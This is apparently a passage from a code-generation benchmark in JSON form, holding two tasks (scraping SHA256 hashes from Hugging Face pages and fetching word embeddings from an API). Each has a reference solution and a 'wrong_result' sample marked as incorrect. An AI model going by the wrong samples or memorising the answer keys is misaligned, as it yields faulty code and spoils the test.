    "Instruction": "Task Description: Scrape SHA256 hashes from Hugging Face dataset pages and save them to a file.\n\nFunction Description: This function scrapes SHA256 hashes from a series of Hugging Face dataset pages by making HTTP GET requests to each page, parsing the HTML content to extract the hashes, and writing them to an output file along with their corresponding filenames. It also prints the collected hashes to the console.\n\nInput: None (The function uses hardcoded URLs and output filename)\n\nOutput: \n1. Writes to \"shard_hashes.txt\" file with format: \"[filename] [SHA256 hash]\"\n2. Prints collected SHA256 hashes to console with format: \"SHA256 hash [index]: [hash]\"\n3. Prints error messages for failed requests or missing hashes",
    "Canonical_solution": "import requests\nimport re\n\ndef scrape_huggingface_hashes():\n    base_url = 'https://huggingface.co/datasets/EleutherAI/pythia_deduped_pile_idxmaps/blob/main/pile_0.87_deduped_text_document-'\n    sha256_list = []\n\n    with open(\"shard_hashes.txt\", \"w\") as output_file:\n        for i in range(83):\n            page_number = f\"{i:05d}-of-00082.bin\"\n            url = base_url + page_number\n            file_name = url.split('/')[-1]\n\n            response = requests.get(url)\n\n            if response.status_code == 200:\n                html_content = response.text\n                matches = re.findall(r'<strong>SHA256:</strong>\\s*([\\da-fA-F]+)', html_content)\n\n                if matches:\n                    sha256_list.extend(matches)\n                    for sha256 in matches:\n                        output_file.write(f\"{file_name} {sha256}\\n\")\n                else:\n                    print(f\"No hash found for file: {file_name}\")\n            else:\n                print(f\"Failed to fetch HTML content from {url}. Status code: {response.status_code}\")\n\n    for idx, sha256 in enumerate(sha256_list, start=1):\n        print(f\"SHA256 hash {idx}: {sha256}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom bs4 import BeautifulSoup\n\ndef scrape_hf_hashes():\n    urls = [\n        \"https://huggingface.co/datasets/username1/dataset1\",\n        \"https://huggingface.co/datasets/username2/dataset2\",\n        \"https://huggingface.co/datasets/username3/dataset3\"\n    ]\n    output_file = \"shard_hashes.txt\"\n    hashes = []\n    index = 0\n\n    for url in urls:\n        try:\n            response = requests.get(url, timeout=10)\n            response.raise_for_status()\n            soup = BeautifulSoup(response.text, 'html.parser')\n            hash_elements = soup.select('div.dataset-card__info span.dataset-card__info-item')\n\n            for element in hash_elements:\n                if 'sha256' in element.text.lower():\n                    hash_value = element.text.strip()\n                    hashes.append((url.split(\"/\")[-2] + \"/\" + url.split(\"/\")[-1], hash_value))\n                    print(f\"SHA256 hash {index}: {hash_value}\")\n                    index += 1\n\n        except requests.RequestException as e:\n            print(f\"Error fetching {url}: {e}\")\n        except Exception as e:\n            print(f\"Unexpected error with {url}: {e}\")\n\n    with open(output_file, 'w') as f:\n        for filename, hash_value in hashes:\n            f.write(f\"{filename} {hash_value}\\n\")"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API, depending on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding (vector representation) for a given word using either a local HTTP API or OpenAI's API. It handles both types of API calls, processes the response, and returns the embedding as a NumPy array. If the request fails, it prints an error message and returns None.\n\nInput:  \n- `word` (str): The word or text to generate an embedding for.  \n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.5\".  \n\nOutput:  \n- `numpy.ndarray` or `None`: Returns the word embedding as a NumPy array if successful; otherwise, returns None.  \n\nNote: The function assumes the local API endpoint is running at `http://localhost:8000/v1/embeddings` and expects a JSON payload with `model` and `input` fields. For OpenAI's API, it assumes the `openai` library is properly configured.",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport numpy as np\nimport openai\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    # Local API endpoint\n    local_api_url = \"http://localhost:8000/v1/embeddings\"\n    \n    # OpenAI API configuration\n    openai.api_key = \"your_openai_api_key\"  # Replace with your actual OpenAI API key\n    \n    # Check if the model is for local API or OpenAI\n    if model == \"vicuna-7b-v1.5\":\n        # Use local API\n        payload = {\n            \"model\": model,\n            \"input\": word\n        }\n        try:\n            response = requests.post(local_api_url, json=payload)\n            response.raise_for_status()\n            data = response.json()\n            embedding = np.array(data[\"data\"][0][\"embedding\"], dtype=np.float32)\n            return embedding\n        except requests.exceptions.RequestException as e:\n            print(f\"Error calling local API: {e}\")\n            return None\n    else:\n        # Use OpenAI API\n        try:\n            response = openai.Embedding.create(\n                input=word,\n                model=model\n            )\n            embedding = np.array(response['data'][0]['embedding'], dtype=np.float32)\n            return embedding\n        except openai.error.OpenAIError as e:\n            print(f\"Error calling OpenAI API: {e}\")\n            return None"
  }
]